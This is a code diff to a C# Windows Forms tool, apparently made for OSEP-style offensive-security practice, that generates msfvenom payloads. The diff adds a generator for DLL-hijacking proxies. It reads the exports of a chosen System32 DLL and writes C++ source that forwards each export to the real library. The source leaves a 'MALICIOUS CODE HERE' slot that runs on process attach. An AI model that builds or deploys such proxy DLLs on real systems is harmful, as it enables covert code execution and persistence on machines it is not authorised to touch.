@@ -4,29 +4,32 @@ using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Linq;
+using System.Reflection.PortableExecutable;
+using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace OSEP_2026
 {
+
+
     public partial class Form1 : Form
     {
         private MSFVenom msv = new MSFVenom();
-
+        
         public Form1()
         {
             InitializeComponent();
             UpdateMSFVenomUI();
             UpdatePayloadText();
+            
         }
 
         private void btnMsvGenerate_Click(object sender, EventArgs e)
         {
             UpdatePayloadText();
-            
-
-
+            List<string> exports = PEHelper.GetExportedFunctions(@"C:\Windows\System32\Kernel32.dll");
         }
 
         private void UpdatePayloadText()
@@ -249,6 +252,69 @@ namespace OSEP_2026
         private void txtMsvCmd_TextChanged(object sender, EventArgs e)
         {
             UpdateMSFVenomUI();
+        }
+
+        private void btnProxyLoad_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog ofd = new OpenFileDialog();
+            ofd.InitialDirectory = @"C:\Windows\System32";
+            ofd.Filter = "DLL Files (*.dll)|*.dll";
+            ofd.DefaultExt = ".dll";
+            ofd.ShowDialog();
+            txtProxyPath.Text = ofd.FileName;
+            List<string> exports = PEHelper.GetExportedFunctions(ofd.FileName);
+            txtProxyOut.Clear();
+            txtProxyOut.Text = ParseProxyDLL(exports, ofd.SafeFileName);
+
+        }
+
+        private string ParseProxyDLL(List<string> exports, string fname)
+        {
+            
+
+            StringBuilder sb = new StringBuilder();
+
+            sb.AppendLine($"// dllmain.cpp : Defines the entry point for the DLL application.");
+            sb.AppendLine($"#include \"pch.h\"");
+            sb.AppendLine($"#include <Windows.h>");
+            sb.AppendLine($"");
+
+            sb.AppendLine($"//Begin proxy stements for {fname}");
+            sb.AppendLine($"#ifdef _WIN64");
+            sb.AppendLine($"#define DLLPATH \"\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\System32\\\\{fname}\"");
+            sb.AppendLine($"#else");
+            sb.AppendLine($"#define DLLPATH \"\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\SysWOW64\\\\{fname}\"");
+            sb.AppendLine($"#endif // _WIN64");
+            sb.AppendLine($"");
+            sb.AppendLine($"");
+
+            foreach (var export in exports)
+            {
+                sb.AppendLine($"#pragma comment(linker, \"/EXPORT:{export}=\" DLLPATH \".{export}\")");
+            }
+
+            sb.AppendLine($"\n");
+
+            sb.AppendLine($"BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {{");
+            sb.AppendLine($"    switch (ul_reason_for_call) {{");
+            sb.AppendLine($"            case DLL_PROCESS_ATTACH: {{");
+            sb.AppendLine($"                //MALICIOUS CODE HERE");
+            sb.AppendLine($"            }}");
+            sb.AppendLine($"            case DLL_THREAD_ATTACH:");
+            sb.AppendLine($"                break;");
+            sb.AppendLine($"            case DLL_THREAD_DETACH:");
+            sb.AppendLine($"                break;");
+            sb.AppendLine($"            case DLL_PROCESS_DETACH:");
+            sb.AppendLine($"                break;");
+            sb.AppendLine($"    }}");
+            sb.AppendLine($"    return TRUE;");
+            sb.AppendLine($"}}");
+
+
+
+
+            return sb.ToString();
+
         }
     }
 }
